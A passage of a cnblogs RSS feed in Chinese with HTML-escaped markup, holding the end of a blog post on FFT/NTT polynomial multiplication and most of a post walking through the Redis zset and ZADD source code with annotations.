    Frn0(i,0,s)if(i&amp;lt;r[i])swap(a[i],a[r[i]]);
    for(int i(2),i2(1);i&amp;lt;=s;i2=i,i&amp;lt;&amp;lt;=1){
        o=fpw(iv?Gi:G,(P-1)/i);
        for(int j(0);j&amp;lt;s;j+=i){
            w=1;
            Frn0(k,0,i2){
                x=a[j+k],y=w*a[j+k+i2]%P;
                a[j+k]=(x+y)%P,a[j+k+i2]=(x-y+P)%P,w=w*o%P;
            }
        }
    }
    if(iv)Frn0(i,0,s)a[i]=a[i]*siv%P;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Time complexity: &lt;span class=&quot;math inline&quot;&gt;\(O(n\log n)\)&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Memory complexity: &lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;看看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images.cnblogs.com/cnblogs_com/BrianPeng/1640550/o_200202142044NTT.PNG&quot;/&gt;&lt;/p&gt;
&lt;p&gt;时间上的提升效果不大，但是空间少了一半（因为用了int而不是complex）&lt;/p&gt;
&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion:&lt;/h3&gt;
&lt;p&gt;打了一天的博客终于写完了（好累）&lt;/p&gt;
&lt;p&gt;但是对FFT和NTT的理解也加深了不少&lt;/p&gt;
&lt;p&gt;这个算法对数学知识和分治思想的要求都很高&lt;/p&gt;
&lt;p&gt;本蒟蒻花了近一年的时间才真正理解&lt;/p&gt;
&lt;p&gt;如果有错误和意见请大佬多多指教&lt;/p&gt;
&lt;p&gt;那么本篇博客就到这里啦，谢谢各位大佬的支持！ありがとう！&lt;/p&gt;
</description>
<pubDate>Sun, 02 Feb 2020 14:31:00 +0000</pubDate>
<dc:creator>BrianPeng</dc:creator>
<og:description>Intro: 本篇博客将会从朴素乘法讲起，经过分治乘法，到达FFT和NTT 旨在能够让读者（也让自己）充分理解其思想 模板题入口： &amp;quot;洛谷 P3803 【模板】多项式乘法（FFT）&amp;quot</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/BrianPeng/p/12251447.html</dc:identifier>
</item>
<item>
<title>Redis（八）：zset/zadd/zrange/zrembyscore 命令源码解析 - 等你归去来</title>
<link>http://www.cnblogs.com/yougewe/p/12253982.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yougewe/p/12253982.html</guid>
<description>&lt;p&gt;　　前面几篇文章，我们完全领略了redis的string,hash,list,set数据类型的实现方法，相信对redis已经不再神秘。&lt;/p&gt;
&lt;p&gt;　　本篇我们将介绍redis的最后一种数据类型: zset 的相关实现。&lt;/p&gt;

&lt;p&gt;　　本篇过后，我们对redis的各种基础功能，应该不会再有疑惑。有可能的话，我们后续将会对redis的高级功能的实现做解析。（如复制、哨兵模式、集群模式）&lt;/p&gt;

&lt;p&gt;　　回归本篇主题，zset。zset 又称有序集合(sorted set)，即是序版本的set。经过上篇的介绍，大家可以看到，redis的读取功能相当有限，许多是基于随机数的方式进行读取，其原因就是set是无序的。当set有序之后，查询能力就会得到极大的提升。1. 可以根据下标进行定位元素; 2. 可以范围查询元素; 这是有序带来的好处。&lt;/p&gt;
&lt;p&gt;　　那么，我们不妨先思考一下，如何实现有序？两种方法：1. 根据添加顺序定义，1、2、3... ; 2. 自定义排序值; 第1种方法实现简单，添加时复杂度小，但是功能受限；第2种方法相对自由，对于每次插入都可能涉及重排序问题，但是查询相对稳定，可以不必完全受限于系统实现;&lt;/p&gt;

&lt;p&gt;　　同样，我们以功能列表，到数据结构，再功能实现的思路，来解析redis的zset有序集合的实现方式吧。&lt;/p&gt;

&lt;p&gt;零、redis zset相关操作方法&lt;/p&gt;
&lt;p&gt;　　zset: Redis 有序集合是string类型元素的集合,且不允许重复的成员。每个元素都会关联一个double类型的分数，通过分数来为集合中的成员进行从小到大的排序。&lt;/p&gt;
&lt;p&gt;　　使用场景如: 保存任务队列，该队列由后台定时扫描; 排行榜;&lt;/p&gt;
&lt;p&gt;　　从官方手册上查到相关使用方法如下：&lt;/p&gt;
&lt;blockquote readability=&quot;64&quot;&gt;
&lt;p&gt;1&amp;gt; ZADD key score1 member1 [score2 member2]&lt;br/&gt;功能: 向有序集合添加一个或多个成员，或者更新已存在成员的分数&lt;br/&gt;返回值: 添加成功的元素个数(已存在的添加不成功)&lt;/p&gt;
&lt;p&gt;2&amp;gt; ZCARD key&lt;br/&gt;功能: 获取有序集合的成员数&lt;br/&gt;返回值: 元素个数或0&lt;/p&gt;
&lt;p&gt;3&amp;gt; ZCOUNT key min max&lt;br/&gt;功能: 计算在有序集合中指定区间分数的成员数&lt;br/&gt;返回值: 区间内的元素个数&lt;/p&gt;
&lt;p&gt;4&amp;gt; ZINCRBY key increment member&lt;br/&gt;功能: 有序集合中对指定成员的分数加上增量 increment&lt;br/&gt;返回值: member增加后的分数&lt;/p&gt;
&lt;p&gt;5&amp;gt; ZINTERSTORE destination numkeys key [key ...]&lt;br/&gt;功能: 计算给定的一个或多个有序集的交集并将结果集存储在新的有序集合 key 中&lt;br/&gt;返回值: 交集元素个数&lt;/p&gt;
&lt;p&gt;6&amp;gt; ZLEXCOUNT key min max&lt;br/&gt;功能: 在有序集合中计算指定字典区间内成员数量&lt;br/&gt;返回值: 区间内的元素个数&lt;/p&gt;
&lt;p&gt;7&amp;gt; ZRANGE key start stop [WITHSCORES]&lt;br/&gt;功能: 通过索引区间返回有序集合指定区间内的成员&lt;br/&gt;返回值: 区间内元素列表&lt;/p&gt;
&lt;p&gt;8&amp;gt; ZRANGEBYLEX key min max [LIMIT offset count]&lt;br/&gt;功能: 通过字典区间返回有序集合的成员&lt;br/&gt;返回值: 区间内元素列表&lt;/p&gt;
&lt;p&gt;9&amp;gt; ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT]&lt;br/&gt;功能: 通过分数返回有序集合指定区间内的成员&lt;br/&gt;返回值: 区间内元素列表&lt;/p&gt;
&lt;p&gt;10&amp;gt; ZRANK key member&lt;br/&gt;功能: 返回有序集合中指定成员的索引&lt;br/&gt;返回值: member的排名或者 nil&lt;/p&gt;
&lt;p&gt;11&amp;gt; ZREM key member [member ...]&lt;br/&gt;功能: 移除有序集合中的一个或多个成员&lt;br/&gt;返回值: 成功移除的元素个数&lt;/p&gt;
&lt;p&gt;12&amp;gt; ZREMRANGEBYLEX key min max&lt;br/&gt;功能: 移除有序集合中给定的字典区间的所有成员&lt;br/&gt;返回值: 成功移除的元素个数&lt;/p&gt;
&lt;p&gt;13&amp;gt; ZREMRANGEBYRANK key start stop&lt;br/&gt;功能: 移除有序集合中给定的排名区间的所有成员&lt;br/&gt;返回值: 成功移除的元素个数&lt;/p&gt;
&lt;p&gt;14&amp;gt; ZREMRANGEBYSCORE key min max&lt;br/&gt;功能: 移除有序集合中给定的分数区间的所有成员&lt;br/&gt;返回值: 成功移除的元素个数&lt;/p&gt;
&lt;p&gt;15&amp;gt; ZREVRANGE key start stop [WITHSCORES]&lt;br/&gt;功能: 返回有序集中指定区间内的成员，通过索引，分数从高到低&lt;br/&gt;返回值: 区间内元素列表及分数&lt;/p&gt;
&lt;p&gt;16&amp;gt; ZREVRANGEBYSCORE key max min [WITHSCORES]&lt;br/&gt;功能: 返回有序集中指定分数区间内的成员，分数从高到低排序&lt;br/&gt;返回值: 区间内元素列表及分数&lt;/p&gt;
&lt;p&gt;17&amp;gt; ZREVRANK key member&lt;br/&gt;功能: 返回有序集合中指定成员的排名，有序集成员按分数值递减(从大到小)排序&lt;br/&gt;返回值: member排名或者 nil&lt;/p&gt;
&lt;p&gt;18&amp;gt; ZSCORE key member&lt;br/&gt;功能: 返回有序集中，成员的分数值&lt;br/&gt;返回值: member分数&lt;/p&gt;
&lt;p&gt;19&amp;gt; ZUNIONSTORE destination numkeys key [key ...]&lt;br/&gt;功能: 计算给定的一个或多个有序集的并集，并存储在新的 key 中&lt;br/&gt;返回值: 存储到新key的元素个数&lt;/p&gt;
&lt;p&gt;20&amp;gt; ZSCAN key cursor [MATCH pattern] [COUNT count]&lt;br/&gt;功能: 迭代有序集合中的元素（包括元素成员和元素分值）&lt;br/&gt;返回值: 元素列表&lt;/p&gt;
&lt;p&gt;21&amp;gt; ZPOPMAX/ZPOPMIN/BZPOPMAX/BZPOPMIN&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;一、zset 相关数据结构&lt;/p&gt;
&lt;p&gt;　　zset 的实现，使用了 ziplist, zskiplist 和 dict 进行实现。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; ZSETs use a specialized version of Skiplists &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
typedef &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; zskiplistNode {
    sds ele;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; score;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; zskiplistNode *&lt;span&gt;backward;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; zskiplistLevel {
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; zskiplistNode *&lt;span&gt;forward;
        unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; span;
    } level[];
} zskiplistNode;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 跳跃链表&lt;/span&gt;
typedef &lt;span&gt;struct&lt;/span&gt;&lt;span&gt; zskiplist {
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; zskiplistNode *header, *&lt;span&gt;tail;
    unsigned &lt;/span&gt;&lt;span&gt;long&lt;/span&gt;&lt;span&gt; length;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; level;
} zskiplist;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; zset 主数据结构，dict + zskiplist&lt;/span&gt;
typedef &lt;span&gt;struct&lt;/span&gt;&lt;span&gt; zset {
    dict &lt;/span&gt;*&lt;span&gt;dict;
    zskiplist &lt;/span&gt;*&lt;span&gt;zsl;
} zset;
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; zset 在合适场景下，将先使用 ziplist 存储数据&lt;/span&gt;
typedef &lt;span&gt;struct&lt;/span&gt;&lt;span&gt; zlentry {
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; prevrawlensize, prevrawlen;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; lensize, len;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; headersize;
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt;&lt;span&gt; encoding;
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;p;
} zlentry;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;二、zadd 添加成员操作&lt;/p&gt;
&lt;p&gt;　　从添加实现中，我们可以完整领略数据结构的运用。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;180&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 用法: ZADD key score1 member1 [score2 member2]
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; zaddCommand(client *&lt;span&gt;c) {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; zadd 的多个参数变形, 使用 flags 进行区分复用&lt;/span&gt;
&lt;span&gt;    zaddGenericCommand(c,ZADD_NONE);
}
&lt;/span&gt;&lt;span&gt;void&lt;/span&gt; zaddGenericCommand(client *c, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; flags) {
    &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;char&lt;/span&gt; *nanerr = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;resulting score is not a number (NaN)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    robj &lt;/span&gt;*key = c-&amp;gt;argv[&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];
    robj &lt;/span&gt;*&lt;span&gt;zobj;
    sds ele;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; score = &lt;span&gt;0&lt;/span&gt;, *scores = NULL, curscore = &lt;span&gt;0.0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; j, elements;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; scoreidx = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; The following vars are used in order to track what the command actually
     * did during the execution, to reply to the client and to trigger the
     * notification of keyspace change. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt; added = &lt;span&gt;0&lt;/span&gt;;      &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Number of new elements added. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt; updated = &lt;span&gt;0&lt;/span&gt;;    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Number of elements with updated score. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt; processed = &lt;span&gt;0&lt;/span&gt;;  &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Number of elements processed, may remain zero with
                           options like XX. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Parse options. At the end 'scoreidx' is set to the argument position
     * of the score of the first score-element pair. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 从第三位置开始尝试解析特殊标识（用法规范）
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 按位与到 flags 中&lt;/span&gt;
    scoreidx = &lt;span&gt;2&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(scoreidx &amp;lt; c-&amp;gt;&lt;span&gt;argc) {
        &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *opt = c-&amp;gt;argv[scoreidx]-&amp;gt;&lt;span&gt;ptr;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; NX: 不更新已存在的元素，只做添加操作&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (!strcasecmp(opt,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)) flags |=&lt;span&gt; ZADD_NX;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; XX: 只做更新操作，不做添加操作&lt;/span&gt;
        &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!strcasecmp(opt,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)) flags |=&lt;span&gt; ZADD_XX;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; CH: 将返回值从添加的新元素数修改为已更改元素的总数。 更改的元素是第添加的新元素以及已为其更新分数的现有元素。 因此，命令行中指定的具有与过去相同分数的元素将不计算在内。 注意：通常，ZADD的返回值仅计算添加的新元素的数量。&lt;/span&gt;
        &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!strcasecmp(opt,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ch&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)) flags |=&lt;span&gt; ZADD_CH;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; INCR: 使用指定元素增加指定分数, 与 ZINCRBY 类似，此场景下，只允许操作一个元素&lt;/span&gt;
        &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!strcasecmp(opt,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;incr&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)) flags |=&lt;span&gt; ZADD_INCR;
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        scoreidx&lt;/span&gt;++&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Turn options into simple to check vars. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;int&lt;/span&gt; incr = (flags &amp;amp; ZADD_INCR) != &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; nx = (flags &amp;amp; ZADD_NX) != &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; xx = (flags &amp;amp; ZADD_XX) != &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; ch = (flags &amp;amp; ZADD_CH) != &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; After the options, we expect to have an even number of args, since
     * we expect any number of score-element pairs. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把特殊标识去除后，剩下的参数列表应该2n数，即 score-element 一一配对的，否则语法错误&lt;/span&gt;
    elements = c-&amp;gt;argc-&lt;span&gt;scoreidx;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (elements % &lt;span&gt;2&lt;/span&gt;&lt;span&gt;) {
        addReply(c,shared.syntaxerr);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    }
    elements &lt;/span&gt;/= &lt;span&gt;2&lt;/span&gt;; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Now this holds the number of score-element pairs. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Check for incompatible options. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 互斥项&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (nx &amp;amp;&amp;amp;&lt;span&gt; xx) {
        addReplyError(c,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;XX and NX options at the same time are not compatible&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 语法检查，INCR 只能针对1个元素操作&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (incr &amp;amp;&amp;amp; elements &amp;gt; &lt;span&gt;1&lt;/span&gt;&lt;span&gt;) {
        addReplyError(c,
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;INCR option supports a single increment-element pair&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Start parsing all the scores, we need to emit any syntax error
     * before executing additions to the sorted set, as the command should
     * either execute fully or nothing at all. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 解析所有的 score 值为double类型，赋值到 scores 中&lt;/span&gt;
    scores = zmalloc(&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;double&lt;/span&gt;)*&lt;span&gt;elements);
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; elements; j++&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (getDoubleFromObjectOrReply(c,c-&amp;gt;argv[scoreidx+j*&lt;span&gt;2&lt;/span&gt;],&amp;amp;&lt;span&gt;scores[j],NULL)
            &lt;/span&gt;!= C_OK) &lt;span&gt;goto&lt;/span&gt;&lt;span&gt; cleanup;
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Lookup the key and create the sorted set if does not exist. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 语法检查&lt;/span&gt;
    zobj = lookupKeyWrite(c-&amp;gt;&lt;span&gt;db,key);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (zobj ==&lt;span&gt; NULL) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (xx) &lt;span&gt;goto&lt;/span&gt; reply_to_client; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; No key + XX option: nothing to do. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 创建原始key对象
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 默认 zset_max_ziplist_entries=OBJ_ZSET_MAX_ZIPLIST_ENTRIES: 128
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 默认 zset_max_ziplist_value=OBJ_ZSET_MAX_ZIPLIST_VALUE: 64
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 所以此处默认主要是检查 第1个member的长度是大于 64&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (server.zset_max_ziplist_entries == &lt;span&gt;0&lt;/span&gt; ||&lt;span&gt;
            server.zset_max_ziplist_value &lt;/span&gt;&amp;lt; sdslen(c-&amp;gt;argv[scoreidx+&lt;span&gt;1&lt;/span&gt;]-&amp;gt;&lt;span&gt;ptr))
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 2. 通用情况使用 dict+quicklist 型的zset &lt;/span&gt;
            zobj =&lt;span&gt; createZsetObject();
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 1. 元素比较小的情况下创建 ziplist 型的 zset&lt;/span&gt;
            zobj =&lt;span&gt; createZsetZiplistObject();
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将对象添加到db中，后续所有操作针对 zobj 操作即是对db的操作 (引用传递)&lt;/span&gt;
        dbAdd(c-&amp;gt;&lt;span&gt;db,key,zobj);
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (zobj-&amp;gt;type !=&lt;span&gt; OBJ_ZSET) {
            addReply(c,shared.wrongtypeerr);
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; cleanup;
        }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 一个个元素循环添加&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; elements; j++&lt;span&gt;) {
        score &lt;/span&gt;=&lt;span&gt; scores[j];

        ele &lt;/span&gt;= c-&amp;gt;argv[scoreidx+&lt;span&gt;1&lt;/span&gt;+j*&lt;span&gt;2&lt;/span&gt;]-&amp;gt;&lt;span&gt;ptr;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 分当前zobj的编码不同进行添加 (ziplist, skiplist)
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3. ZIPLIST 编码下的zset添加操作&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (zobj-&amp;gt;encoding ==&lt;span&gt; OBJ_ENCODING_ZIPLIST) {
            unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;eptr;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3.1. 查找是否存在要添加的元素 （确定添加或更新）&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; ((eptr = zzlFind(zobj-&amp;gt;ptr,ele,&amp;amp;curscore)) !=&lt;span&gt; NULL) {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (nx) &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (incr) {
                    score &lt;/span&gt;+=&lt;span&gt; curscore;
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isnan(score)) {
                        addReplyError(c,nanerr);
                        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; cleanup;
                    }
                }

                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Remove and re-insert when score changed. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (score !=&lt;span&gt; curscore) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3.2. 元素更新操作，先删再插入&lt;/span&gt;
                    zobj-&amp;gt;ptr = zzlDelete(zobj-&amp;gt;&lt;span&gt;ptr,eptr);
                    zobj&lt;/span&gt;-&amp;gt;ptr = zzlInsert(zobj-&amp;gt;&lt;span&gt;ptr,ele,score);
                    server.dirty&lt;/span&gt;++&lt;span&gt;;
                    updated&lt;/span&gt;++&lt;span&gt;;
                }
                processed&lt;/span&gt;++&lt;span&gt;;
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;xx) {
                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Optimize: check if the element is too large or the list
                 * becomes too long *before* executing zzlInsert. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
                zobj&lt;/span&gt;-&amp;gt;ptr = zzlInsert(zobj-&amp;gt;&lt;span&gt;ptr,ele,score);
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 5. 超过一条件后，做 ziplist-&amp;gt;skiplist 转换
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 默认 元素个数&amp;gt;128, 当前元素&amp;gt;64
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这两个判断不会重复吗？？ 两个原因: 1. 转换函数内部会重新判定; 2. 下一次循环时不会再走当前逻辑;&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (zzlLength(zobj-&amp;gt;ptr) &amp;gt;&lt;span&gt; server.zset_max_ziplist_entries)
                    zsetConvert(zobj,OBJ_ENCODING_SKIPLIST);
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (sdslen(ele) &amp;gt;&lt;span&gt; server.zset_max_ziplist_value)
                    zsetConvert(zobj,OBJ_ENCODING_SKIPLIST);
                server.dirty&lt;/span&gt;++&lt;span&gt;;
                added&lt;/span&gt;++&lt;span&gt;;
                processed&lt;/span&gt;++&lt;span&gt;;
            }
        } 
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 4. skiplist 下的zset元素添加&lt;/span&gt;
        &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (zobj-&amp;gt;encoding ==&lt;span&gt; OBJ_ENCODING_SKIPLIST) {
            zset &lt;/span&gt;*zs = zobj-&amp;gt;&lt;span&gt;ptr;
            zskiplistNode &lt;/span&gt;*&lt;span&gt;znode;
            dictEntry &lt;/span&gt;*&lt;span&gt;de;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 判断ele是否已存在，使用hash查找，快速&lt;/span&gt;
            de = dictFind(zs-&amp;gt;&lt;span&gt;dict,ele);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (de !=&lt;span&gt; NULL) {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (nx) &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
                curscore &lt;/span&gt;= *(&lt;span&gt;double&lt;/span&gt;*&lt;span&gt;)dictGetVal(de);

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (incr) {
                    score &lt;/span&gt;+=&lt;span&gt; curscore;
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isnan(score)) {
                        addReplyError(c,nanerr);
                        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Don't need to check if the sorted set is empty
                         * because we know it has at least one element. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
                        &lt;span&gt;goto&lt;/span&gt;&lt;span&gt; cleanup;
                    }
                }

                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Remove and re-insert when score changes. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
